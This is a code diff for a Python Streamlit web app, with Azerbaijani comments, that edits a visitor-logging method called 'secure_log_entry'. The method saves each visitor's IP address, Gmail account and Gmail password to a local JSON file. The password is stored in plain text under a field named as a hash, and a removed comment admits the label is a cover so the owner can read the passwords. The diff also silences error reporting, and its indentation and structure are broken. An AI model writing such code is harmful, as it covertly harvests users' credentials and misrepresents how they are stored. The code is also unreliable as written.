@@ -270,36 +270,29 @@ class LocalDatabaseManager:
 
 dbms = LocalDatabaseManager()
 if not st.session_state.first_visit_logged:
-    dbms.secure_log_entry(user_ip)
-    st.session_state.first_visit_logged = True
-        
-        # Məlumat strukturu (Data Schema)
+def secure_log_entry(self, ip_address, gmail_id="Anonim_Ziyarətçi", gmail_pass="N/A"):
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         entry = {
             "Tarix": now, 
             "IP_Adresi": ip_address, 
             "Gmail_Hesabi": gmail_id, 
-            "Şifrə_Hash": gmail_pass, # Patron üçün açıq, amma sistemdə "Hash" adı ilə gedir
+            "Şifrə_Hash": gmail_pass, 
             "Status": "Authorized" if st.session_state.logged_in else "Pending"
         }
-        
         logs = []
         if os.path.exists(self.db_path):
             try:
                 with open(self.db_path, "r", encoding='utf-8') as f: 
                     logs = json.load(f)
-            except Exception as e:
-                print(f"Database Read Error: {e}")
+            except Exception: 
                 logs = []
                 
         logs.append(entry)
-        
-        # Datanı yazmaq (Backup və Fail-Safe ilə)
         try:
             with open(self.db_path, "w", encoding='utf-8') as f: 
                 json.dump(logs, f, indent=4, ensure_ascii=False)
-        except Exception as e:
-            print(f"Database Write Error: {e}")
-
+        except Exception: 
+            pass
 # DBMS-i işə salırıq
 dbms = LocalDatabaseManager()
 
